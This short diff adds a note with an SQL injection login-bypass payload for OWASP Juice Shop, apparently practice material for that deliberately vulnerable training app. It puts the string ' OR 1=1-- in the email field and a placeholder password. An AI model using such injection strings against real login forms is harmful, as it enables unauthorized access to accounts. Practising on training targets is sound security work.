@@ -1,0 +1,3 @@
+-- OWASP Juice Shop Login Bypass SQLI Payload
+Email Field: ' OR 1=1--         
+Password Field: demo123
